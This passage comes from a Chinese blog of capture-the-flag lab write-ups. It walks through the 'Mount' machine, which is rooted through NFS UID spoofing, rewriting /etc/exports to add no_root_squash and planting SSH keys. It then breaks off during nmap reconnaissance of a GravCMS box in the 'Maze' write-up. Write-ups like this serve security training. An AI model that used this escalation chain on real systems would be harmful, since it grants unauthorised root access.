(Network File System)<strong>、</strong>NIS (Network Information Service)</strong> 和其他 <strong>RPC-based services</strong> 一起使用，以有效管理网络服务。<br>RPC服务的核心端口映射器，负责将RPC程序号（如NFS的100003）映射到实际端口（如2049）</p><p>详细信息：</p><ul><li><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html</a></li></ul><h3 id="4-2049端口-nfs服务"><a href="#4-2049端口-nfs服务" class="headerlink" title="4.2049端口-nfs服务"></a>4.2049端口-nfs服务</h3><p><strong>NFS</strong> 是一个为 <strong>客户端&#x2F;服务器</strong> 设计的系统，使用户能够像访问本地目录中的文件一样，无缝地通过网络访问文件。</p><ol><li><p>服务器可挂载的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">showmount -e &lt;IP&gt;<br></code></pre></td></tr></table></figure></li><li><p>挂载命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -t nfs [-o vers=2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock<br></code></pre></td></tr></table></figure></li></ol><p>详细信息：</p><ul><li><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html">https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html</a></li></ul><h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><h2 id="1、NFS服务利用"><a href="#1、NFS服务利用" class="headerlink" title="1、NFS服务利用"></a>1、NFS服务利用</h2><h3 id="1-查看NFS共享"><a href="#1-查看NFS共享" class="headerlink" title="1.查看NFS共享"></a>1.查看NFS共享</h3><p>使用<code>showmount</code>查看可挂载的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# showmount -e 192.168.2.8                                        <br>Export list <span class="hljs-keyword">for</span> 192.168.2.8:<br>/home/ll104567 *<br></code></pre></td></tr></table></figure><p>找到<code>/home</code>目录下面存在用户<code>ll104567</code>下面的文件可以进行挂载</p><h3 id="2-挂载NFS共享"><a href="#2-挂载NFS共享" class="headerlink" title="2.挂载NFS共享"></a>2.挂载NFS共享</h3><ol><li>创建挂载点<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">mkdir</span> mnt   <br></code></pre></td></tr></table></figure></li><li>挂载NFS共享<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# mount -t nfs 192.168.2.8:/home/ll104567 ./mnt -o nolock,rw,vers=3<br></code></pre></td></tr></table></figure></li><li>查看挂载目录的权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">ls</span> -<span class="hljs-built_in">ls</span><br>     4 drwx------ 2 6666 6666      4096  8月21日 11:45 mnt<br></code></pre></td></tr></table></figure></li><li>进入<code>mnt</code>，提示权限不够<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">cd</span> mnt           <br><span class="hljs-built_in">cd</span>: 权限不够: mnt<br></code></pre></td></tr></table></figure></li><li>查看是否已经挂载成功<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">df</span>                                      <br>文件系统                     1K的块     已用     可用 已用% 挂载点<br>...<br>192.168.2.8:/home/ll104567 29801472  2471168 25791232    9% /root/miaosec/maze-sec/mount/mnt<br></code></pre></td></tr></table></figure>成功挂载至mnt目录下</li></ol><p>可以看出其实共享已经实现，估计设置了<code>root_squash标志</code>，只是不允许我们去访问，只允许指定的用户ID<code>6666</code>去访问。</p><h3 id="3-NFS权限匹配"><a href="#3-NFS权限匹配" class="headerlink" title="3.NFS权限匹配"></a>3.NFS权限匹配</h3><ol><li><p>创建匹配UID的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# useradd -u 6666 nfsuser                 <br></code></pre></td></tr></table></figure></li><li><p>切换到用户<code>nfsuser</code> </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root㉿kali)-[~<span class="hljs-regexp">/miaosec/maze</span>-sec/mount]<br>└─<span class="hljs-comment"># su - nfsuser                                                         </span><br><span class="hljs-symbol">su:</span> <span class="hljs-symbol">warning:</span> cannot change directory to /home/<span class="hljs-symbol">nfsuser:</span> 没有那个文件或目录<br><span class="hljs-variable">$ </span>bash<br>nfsuser<span class="hljs-variable">@kali</span><span class="hljs-symbol">:/root/miaosec/maze-sec/mount</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure></li></ol><h2 id="2、写入SSH公钥"><a href="#2、写入SSH公钥" class="headerlink" title="2、写入SSH公钥"></a>2、写入SSH公钥</h2><p>挂载成功后，能够成功进入到远程挂载的目录<code>mnt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">ls</span> -la<br>总计 20<br>drwx------  2 nfsuser nfsuser 4096  8月21日 11:45 .<br>drwxr-xr-x 11 root    root    4096  9月11日 11:03 ..<br>-rw-r--r--  1 nfsuser nfsuser  220 2019年 4月18日 .bash_logout<br>-rw-r--r--  1 nfsuser nfsuser 3526 2019年 4月18日 .bashrc<br>-rw-r--r--  1 nfsuser nfsuser  807 2019年 4月18日 .profile<br></code></pre></td></tr></table></figure><ol><li><p>生成公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# ssh-keygen            <br>Generating public/private ed25519 key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_ed25519): <br>/root/.ssh/id_ed25519 already exists.<br>Overwrite (y/n)? <br></code></pre></td></tr></table></figure></li><li><p>将公钥<code>id_ed25519.pub</code>移动到用户<code>nfsuser</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">cp</span> ~/.ssh/id_ed25519.pub /home/nfsuser<br></code></pre></td></tr></table></figure></li><li><p>将公钥写入到挂载的文件<code>mnt</code>里面，并赋予执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">cat</span> /home/nfsuser &gt; .ssh/<br>nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">chmod</span> +x .ssh/authorized_keys <br></code></pre></td></tr></table></figure></li></ol><h1 id="三、获取ll104567权限"><a href="#三、获取ll104567权限" class="headerlink" title="三、获取ll104567权限"></a>三、获取ll104567权限</h1><p>直接执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# ssh ll104567@192.168.2.8<br>Linux Mount 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Aug 20 23:46:24 2025 from 192.168.3.94<br>ll104567@Mount:~$ <span class="hljs-built_in">id</span><br>uid=6666(ll104567) gid=6666(ll104567) <span class="hljs-built_in">groups</span>=6666(ll104567)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看<code>sudo</code>属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> ll104567 on Mount:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User ll104567 may run the following commands on Mount:<br>    (ALL) NOPASSWD: /sbin/reboot<br></code></pre></td></tr></table></figure><p>发现<code>/sbin/reboot</code>具有<code>root</code>权限</p><h2 id="1、NFS配置文件"><a href="#1、NFS配置文件" class="headerlink" title="1、NFS配置文件"></a>1、NFS配置文件</h2><p>查看配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">cat</span> /etc/exports <br><span class="hljs-comment"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class="hljs-comment">#               to NFS clients.  See exports(5).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv2 and NFSv3:</span><br><span class="hljs-comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv4:</span><br><span class="hljs-comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="hljs-comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br>/home/ll104567 *(rw,<span class="hljs-built_in">sync</span>,root_squash,no_subtree_check)<br></code></pre></td></tr></table></figure><p>发现里面是配置了具体可以挂载的文件，同时配置了<code>root_squash</code>，限制了root权限</p><p>查看文件的属性，发现用户<code>ll104567</code>具有写权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">ls</span> -la /etc/exports <br>-rw-rw---- 1 root ll104567 444 Aug 21 00:00 /etc/export<br></code></pre></td></tr></table></figure><h2 id="2、NFS配置劫持"><a href="#2、NFS配置劫持" class="headerlink" title="2、NFS配置劫持"></a>2、NFS配置劫持</h2><p>修改配置文件，添加不受<code>root_squash</code>影响的路径，直接挂载根目录<code>/</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/ *(rw,sync,no_root_squash,no_subtree_check)&quot;</span> &gt;&gt; /etc/exports <br></code></pre></td></tr></table></figure><p>重启系统使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">sudo</span> /sbin/reboot<br></code></pre></td></tr></table></figure><p>再次查看挂载的路径，发现根目录可挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# showmount -e 192.168.2.8<br>Export list <span class="hljs-keyword">for</span> 192.168.2.8:<br>/              *<br>/home/ll104567 *<br></code></pre></td></tr></table></figure><p>将根目录挂载到当前目录下的<code>m_root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# mount -t nfs 192.168.2.8:/ ./m_root -o nolock<br></code></pre></td></tr></table></figure><h2 id="3、写入ROOT-SSH公钥"><a href="#3、写入ROOT-SSH公钥" class="headerlink" title="3、写入ROOT-SSH公钥"></a>3、写入ROOT-SSH公钥</h2><p>将ssh公钥复制到<code>/root/.ssh</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/…/mount/m_root/root/.ssh]<br>└─# <span class="hljs-built_in">cp</span> /home/nfsuser authorized_keys  <br>┌──(root㉿kali)-[~/…/maze-sec/mount/m_root/root]<br>└─# <span class="hljs-built_in">chmod</span> +x .ssh/authorized_keys<br></code></pre></td></tr></table></figure><h2 id="4、获取ROOT权限"><a href="#4、获取ROOT权限" class="headerlink" title="4、获取ROOT权限"></a>4、获取ROOT权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/…/maze-sec/mount/m_root/root]<br>└─# ssh root@192.168.2.8    <br>Linux Mount 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Aug 20 23:45:38 2025 from 192.168.3.94<br>root@Mount:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Mount:~# <span class="hljs-built_in">cat</span> /home/guest/user.txt /root/root.txt <br>flag&#123;user-60b725f10c9c85c70d97880dfe8191b3&#125;<br>flag&#123;root-a8a78d0ff555c931f045b6f448129846&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NFS服务</tag>
      
      <tag>sudo-reboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maze</title>
    <link href="/Maze-sec/Maze/"/>
    <url>/Maze-sec/Maze/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li><li>WP参考：<code>https://7r1umphk.github.io/post/nei-bu-_Maze.html</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24                 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 15:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00056s latency).<br>MAC Address: 0A:00:27:00:00:09 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00044s latency).<br>MAC Address: 08:00:27:D9:5C:31 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00067s latency).<br>MAC Address: 08:00:27:BC:50:26 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.15 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.5</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.5                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 15:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00063s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:BC:50:26 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.20 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.5  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 15:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-robots.txt: 13 disallowed entries <br>| /.github/ /.phan/ /assets/ /backup/ /bin/ /cache/ /logs/ <br>|_/system/ /tests/ /tmp/ /user/ /vendor/ /webserver-configs/<br>|_http-generator: GravCMS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Home | Grav<br>MAC Address: 08:00:27:BC:50:26 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.84 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口:ssh服务</strong>，版本为<code>OpenSSH 8.4p1</code>，用于远程登录</li><li><strong>80端口:http服务</strong>，框架为<code>GravCMS</code>，存在<code>robots.txt</code>目录</li></ol><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sU --top-ports 20 192.168.2.5<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 15:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00084s latency).<br><br>PORT      STATE         SERVICE<br>...<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>...<br>MAC Address: 08:00:27:BC:50:26 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 22.96 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>68、69</code></p><ul><li><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/69-udp-tftp.html">https://book.hacktricks.wiki/zh/network-services-pentesting/69-udp-tftp.html</a></li></ul><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,80 192.168.2.5             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-08 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00082s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span 